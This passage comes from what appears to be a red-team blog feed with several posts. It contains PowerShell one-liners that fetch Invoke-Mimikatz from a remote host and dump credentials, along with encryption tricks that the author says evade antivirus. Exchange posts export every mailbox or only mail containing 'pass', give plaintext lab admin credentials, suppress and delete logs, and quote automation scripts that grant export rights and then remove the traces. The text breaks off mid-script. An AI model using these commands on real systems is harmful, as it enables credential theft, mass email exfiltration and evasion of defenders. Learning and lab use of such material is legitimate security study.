is NTLM[*] RPC URL set: http:&#x2F;&#x2F;owa2013.rootkit.org&#x2F;rpc&#x2F;rpcproxy.dll?49f2f623-0a1c-4a39-860f-6fc88d9ee943@rootkit.org:6001[*] Setting up channels[+] Binding to RPCpanic: runtime error: slice bounds out of range [16:0]goroutine 39 [running]:github.com&#x2F;sensepost&#x2F;ruler&#x2F;utils.ReadBytes(...)&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;utils&#x2F;utils.go:223github.com&#x2F;sensepost&#x2F;ruler&#x2F;rpc-http.(*RPCResponse).Unmarshal(0xc00010fe50, 0xc0001a8172, 0x1b, 0xe8e, 0x1, 0xc0000f82a0, 0x0)&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;rpc-http&#x2F;packets.go:472 +0x37fgithub.com&#x2F;sensepost&#x2F;ruler&#x2F;rpc-http.RPCOpenOut(0xc0004a6070, 0x61, 0xc0004ea000, 0xc0004ea060)&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;rpc-http&#x2F;rpctransport.go:237 +0x253created by github.com&#x2F;sensepost&#x2F;ruler&#x2F;rpc-http.RPCOpen&#x2F;home&#x2F;staaldraad&#x2F;dev&#x2F;ruler&#x2F;rpc-http&#x2F;rpctransport.go:190 +0x11b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210804204755843.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Exchange </tag>
            
            <tag> Ruler </tag>
            
            <tag> RCE </tag>
            
            <tag> Outlook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A solution to the failure of the trust relationship between this workstation and the primary domain</title>
      <link href="2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/"/>
      <url>2021/08/01/a-solution-to-the-failure-of-the-trust-relationship-between-this-workstation-and-the-primary-domain/</url>
      
        <content type="html"><![CDATA[<h2 id="The-cause"><a href="#The-cause" class="headerlink" title="The cause"></a>The cause</h2><pre class="line-numbers language-none"><code class="language-none">The domain controller is faulty and is redeployed. The domain machine is found to have the following problems, It cannot be used normally<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231855683.png"></p><h2 id="The-solution"><a href="#The-solution" class="headerlink" title="The solution"></a>The solution</h2><pre class="line-numbers language-none"><code class="language-none">The local administrator logs in to the faulty machine, adds it to a group, and restarts it<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801231947795.png"></p><pre class="line-numbers language-none"><code class="language-none">Restart and then join the domain again<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801232006784.png"></p><pre class="line-numbers language-none"><code class="language-none">After the system restarts, it can be used normally<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/A%20solution%20to%20the%20failure%20of%20the%20trust%20relationship%20between%20this%20workstation%20and%20the%20primary%20domain/image-20210801232023351.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Domain environment </tag>
            
            <tag> Operations </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell bypass catch password</title>
      <link href="2021/07/31/powershell-bypass-catch-password/"/>
      <url>2021/07/31/powershell-bypass-catch-password/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">From a practical point of view, solve the practical problems encountered, simple record, can bypass 360 and HuoRong<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">According to PowerShell&#39;s default policy, ps1 scripts are not allowed to executeGet-executionpolicy indicates that the current policy is Restricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/1.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">You can change the execution policy with the administrator permission<span class="token punctuation">.</span> <span class="token keyword">Do</span> not ask me why I have the administrator permission<span class="token punctuation">.</span> You can not <span class="token keyword">catch</span> passwords with the normal user<span class="token function">Set-ExecutionPolicy</span> Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/2.png"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="PSV2"><a href="#PSV2" class="headerlink" title="PSV2"></a>PSV2</h3><pre class="line-numbers language-none"><code class="language-none">as we all known the easy way like thispowershell -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;now you can use the v2 maybe can bypass some av like thispowershell -Version 2 -exec bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.159.1:8888&#x2F;Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -DumpCreds&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/3.png"></p><h3 id="Encode-script"><a href="#Encode-script" class="headerlink" title="Encode script"></a>Encode script</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">as we all know the Powersploit project<span class="token punctuation">,</span> how about use this project to bypass?Here we use the <span class="token function">out-encryptedScript</span> to place the script in the same directory as the MimiKatz script<span class="token punctuation">,</span> and then encrypt it in turn<span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Out-EncryptedScript</span><span class="token punctuation">.</span>ps1<span class="token function">Out-EncryptedScript</span> <span class="token operator">-</span>ScriptPath <span class="token punctuation">.</span>\<span class="token function">Invoke-Mimikatz</span><span class="token punctuation">.</span>ps1 <span class="token operator">-</span>Password woshijiamide <span class="token operator">-</span>Salt safety<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/4.png">```</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">let our ps1script up to our tar then like thispowershell<span class="token punctuation">.</span>exe<span class="token function">IEX</span><span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">"http://192.168.159.1:8888/Out-EncryptedScript.ps1"</span><span class="token punctuation">)</span> <span class="token namespace">[String]</span> <span class="token variable">$cmd</span> = <span class="token function">Get-Content</span> <span class="token punctuation">.</span>\new1<span class="token punctuation">.</span>ps1<span class="token function">Invoke-Expression</span> <span class="token variable">$cmd</span><span class="token variable">$decrypted</span> = de woshijiamide safety<span class="token function">Invoke-Expression</span> <span class="token variable">$decrypted</span><span class="token function">Invoke-Mimikatz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/5.png"></p><pre class="line-numbers language-none"><code class="language-none">the same way, Of course, both files are put remote, also does not affect the final effect maybe will get some wrong, but we also can catch PW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> Mimikatz </tag>
            
            <tag> Catch Password </tag>
            
            <tag> Powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exchange Export email methods</title>
      <link href="2021/07/30/exchange-export-email-methods/"/>
      <url>2021/07/30/exchange-export-email-methods/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Assuming that you have obtained the administrative rights of the Exchange server, what you need to do now is to search and export the emails in the server, so as to obtain more critical and sensitive information, such as looking for passwords and personal information<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Basic-information-Acquisition"><a href="#Basic-information-Acquisition" class="headerlink" title="Basic information Acquisition"></a>Basic information Acquisition</h2><pre class="line-numbers language-none"><code class="language-none">Get your tar accountGet-MailboxStatistics -Identity yangsir |fl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png"></p><h2 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h2><h3 id="PSSession"><a href="#PSSession" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;rootkit.org\administrator&quot;$Pass &#x3D; ConvertTo-SecureString -AsPlainText admin!@#45 -Force$Credential &#x3D; New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass$Session &#x3D; New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http:&#x2F;&#x2F;OWA2013&#x2F;PowerShell&#x2F; -Authentication Kerberos -Credential $CredentialImport-PSSession $Session -AllowClobber<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.35.png"></p><pre class="line-numbers language-none"><code class="language-none">session address must be fqdn, if not fqdn will wrong like this<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.39.png"></p><pre class="line-numbers language-none"><code class="language-none">get pssession info：Get-PSSessionstop PSSession：Remove-PSSession $Sessionget account：Get-Mailbox<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.46.png"></p><h3 id="Use-exchange"><a href="#Use-exchange" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">add the manager unitAdd-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="MSDN-info"><a href="#MSDN-info" class="headerlink" title="MSDN info"></a>MSDN info</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;powershell&#x2F;module&#x2F;exchange&#x2F;?view&#x3D;exchange-ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Get-all-account"><a href="#Get-all-account" class="headerlink" title="Get all account"></a>Get all account</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.50.png"></p><h4 id="Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox"><a href="#Get-all-mailbox-information-including-the-number-of-messages-the-last-time-to-access-the-mailbox" class="headerlink" title="Get all mailbox information, including the number of messages, the last time to access the mailbox"></a>Get all mailbox information, including the number of messages, the last time to access the mailbox</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.58.png"></p><h4 id="Get-all-ou"><a href="#Get-all-ou" class="headerlink" title="Get all ou"></a>Get all ou</h4><pre class="line-numbers language-none"><code class="language-none">Get-OrganizationalUnit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.07.png"></p><h4 id="Get-the-follow-log"><a href="#Get-the-follow-log" class="headerlink" title="Get the follow log"></a>Get the follow log</h4><pre class="line-numbers language-none"><code class="language-none">system dir %ExchangeInstallPath%TransportRoles\Logs\MessageTracking<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.13.png"></p><h4 id="Gets-the-sender-information-of-the-specified-sender"><a href="#Gets-the-sender-information-of-the-specified-sender" class="headerlink" title="Gets the sender information of the specified sender"></a>Gets the sender information of the specified sender</h4><pre class="line-numbers language-none"><code class="language-none">See yangsir@rootkit.org for information about all emails sent from 18:00, 28 July 2021 to presentGet-MessageTrackingLog -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.18.png"></p><pre class="line-numbers language-none"><code class="language-none">same way to the example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.21.png"></p><pre class="line-numbers language-none"><code class="language-none">Get more easy infoGet-MessageTrackingLog -EventID send -Start &quot;07&#x2F;28&#x2F;2019 18:00:00&quot; -Sender &quot;yangsir@rootkit.org&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.25.png"></p><h2 id="Export"><a href="#Export" class="headerlink" title="Export"></a>Export</h2><h3 id="PSSession-1"><a href="#PSSession-1" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">Need connection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.30.png"></p><pre class="line-numbers language-none"><code class="language-none">Adds the current user to the Mailbox Import Expor role group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.33.png"></p><h4 id="Export-special-user"><a href="#Export-special-user" class="headerlink" title="Export  special user"></a>Export  special user</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)this way to export the daochu dir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.21.39.png"></p><h4 id="Export-the-key-from-email"><a href="#Export-the-key-from-email" class="headerlink" title="Export the key from email"></a>Export the key from email</h4><pre class="line-numbers language-none"><code class="language-none">$User &#x3D; &quot;yangsir&quot;New-MailboxexportRequest -mailbox $User -ContentFilter &#123;(body -like &quot;*pass*&quot;)&#125; -FilePath (&quot;\\localhost\c$\daochu1\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.00.png"></p><h4 id="Export-all-email"><a href="#Export-all-email" class="headerlink" title="Export all email"></a>Export all email</h4><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%&#123;New-MailboxexportRequest -mailbox $_.name -FilePath (&quot;\\localhost\c$\all\&quot;+($_.name)+&quot;.pst&quot;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Export-log"><a href="#Export-log" class="headerlink" title="Export log"></a>Export log</h4><pre class="line-numbers language-none"><code class="language-none">get log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.04.png"></p><pre class="line-numbers language-none"><code class="language-none">you can use this way to not make log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.08.png"></p><pre class="line-numbers language-none"><code class="language-none">del all log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.12.png"></p><h4 id="PS-AUTO"><a href="#PS-AUTO" class="headerlink" title="PS AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">follow <span class="token keyword">from</span> 3gstudent <span class="token keyword">function</span> UsePSSessionToExportMailfromExchange<span class="token punctuation">&#123;</span><span class="token comment">#Requires -Version 2.0</span><span class="token comment">&lt;#.SYNOPSISThis script will export the mail(.pst) from the Exchange server.First it will use PSSession to connect the Exchange server.Then it'll check the user's privilege.If the user is not in the "Mailbox Import Export",the script will add the user to it and reconnect the Exchange server.Next it will export the mail and save it.At last it will remove the user from the group and remove the PSSession.Author: 3gstudent.PARAMETER UserThe user to use.In general, you can choose the account in the domain admins..PARAMETER PasswordThe password of the user..PARAMETER MailBoxThe mail you want to export..PARAMETER ExportPathThe export path of the mail..PARAMETER ConnectionUriThe uri of the Exchange server.Eg.    http://Exchange01.test.com/PowerShell/    .PARAMETER $FilterThe search filter of the mail..EXAMPLEPS C:\> UsePSSessionToExportMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ExportPath "\\Exchange01.test.com\c$\test\" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;"#></span> <span class="token keyword">param</span> <span class="token punctuation">(</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$User</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$Password</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$ConnectionUri</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$Filter</span><span class="token punctuation">)</span>    <span class="token variable">$Flag</span> = 0    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Import-PSSession"</span>     <span class="token comment">#Import-PSSession</span>    <span class="token variable">$Pass</span> = <span class="token function">ConvertTo-SecureString</span> <span class="token operator">-</span>AsPlainText <span class="token variable">$Password</span> <span class="token operator">-</span>Force    <span class="token variable">$Credential</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential <span class="token operator">-</span>ArgumentList <span class="token variable">$User</span><span class="token punctuation">,</span><span class="token variable">$Pass</span>    <span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>    <span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to check user"</span>    <span class="token comment">#check user</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token operator">-</span>ErrorAction SilentlyContinue<span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>    <span class="token function">Write-Host</span> <span class="token string">"[!] The specified user already exists.No need to add it to the group"</span><span class="token variable">$Flag</span> = 1    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to add user"</span>     <span class="token comment">#Add user</span>    <span class="token function">New-ManagementRoleAssignment</span> –Role <span class="token string">"Mailbox Import Export"</span> –User <span class="token variable">$User</span><span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to reconnect"</span>    <span class="token comment">#Reconnect</span>    <span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>    <span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>    <span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>    <span class="token punctuation">&#125;</span>    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span>     <span class="token comment">#Export mail and do not save the export request</span>    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token variable">$Filter</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Flag</span> = 0<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to remove user"</span>    <span class="token comment">#Remove user</span>    <span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token punctuation">|</span><span class="token function">Remove-ManagementRoleAssignment</span> <span class="token operator">-</span>Confirm:<span class="token boolean">$false</span>    <span class="token punctuation">&#125;</span>        <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Remove-PSSession"</span>    <span class="token comment">#Remove PSSession</span>    <span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Use-exchange-1"><a href="#Use-exchange-1" class="headerlink" title="Use exchange"></a>Use exchange</h3><h4 id="Export-special-user-1"><a href="#Export-special-user-1" class="headerlink" title="Export special user"></a>Export special user</h4><pre class="line-numbers language-none"><code class="language-none">Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;$User &#x3D; &quot;yangsir&quot;New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.18.png"></p><h4 id="PS-AUTO-1"><a href="#PS-AUTO-1" class="headerlink" title="PS AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">same way <span class="token keyword">from</span> the 3gstudent<span class="token keyword">function</span> DirectExportMailfromExchange<span class="token punctuation">&#123;</span><span class="token comment">#Requires -Version 2.0</span><span class="token comment">&lt;#.SYNOPSISThis script will export the mail(.pst) from the Exchange server.The script needs to be executed on the Exchange server.Author: 3gstudent.PARAMETER MailBoxThe mail you want to export..PARAMETER ExportPathThe export path of the mail. .PARAMETER $FilterThe search filter of the mail..PARAMETER $VersionThe version of the Exhange.It can be 2007,2010,2013 and 2016..EXAMPLEPS C:\> DirectExportMailfromExchange -MailBox "test1" -ExportPath "\\localhost\c$\test\" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;" -Version 2013#></span> <span class="token keyword">param</span> <span class="token punctuation">(</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$Filter</span><span class="token punctuation">,</span>        <span class="token namespace">[Parameter(Mandatory = $True)]</span><span class="token namespace">[string]</span><span class="token variable">$Version</span><span class="token punctuation">)</span>    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to add PSSnapin"</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2007<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>Admin<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2010<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>E2010<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>                <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>SnapIn<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span>     <span class="token comment">#Export mail and do not save the export request</span>    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token punctuation">&#123;</span><span class="token punctuation">(</span>body <span class="token operator">-like</span> <span class="token string">"*pass*"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token 